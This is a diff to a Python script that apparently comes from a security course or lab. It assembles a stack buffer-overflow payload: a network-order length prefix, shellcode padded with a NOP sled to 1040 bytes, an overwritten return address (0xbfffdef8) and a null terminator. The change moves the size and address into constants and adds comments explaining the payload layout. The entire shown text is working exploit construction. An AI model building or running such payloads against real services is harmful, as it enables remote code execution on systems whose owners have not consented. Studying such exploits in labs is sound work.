@@ -11,6 +11,10 @@ NOP = '\x90'.encode('latin1')
 
 PATH_TO_SHELLCODE = './shellcode.asm'
 
+SIZE_OF_OVERFLOW = 1040
+
+PATCHED_RET_ADDR = 0xbfffdef8
+
 def get_shellcode() -> bytes:
     """This function returns the machine code (bytes) of the shellcode.
 
@@ -61,9 +65,12 @@ def get_payload() -> bytes:
          The bytes of the payload.
     """
     shellcode = get_shellcode()
-    size = network_order_uint32(800 + 240 + 4 + 1)
-    patched_ret_addr = struct.pack('<I', 0xbfffdef8)
-    payload = size + shellcode.rjust(1040, NOP) + patched_ret_addr + "\0".encode('latin1')
+    # size of the message in network order
+    size = network_order_uint32(SIZE_OF_OVERFLOW + 4 + 1)
+    # the return address in little endian
+    patched_ret_addr = struct.pack('<I', PATCHED_RET_ADDR)
+    # the payload is built of the size of the message then the nop sile and the shellcode then the patched return address and then the "\0" to end the message
+    payload = size + shellcode.rjust(SIZE_OF_OVERFLOW, NOP) + patched_ret_addr + "\0".encode('latin1')
     return payload
 
 def network_order_uint32(value) -> bytes:
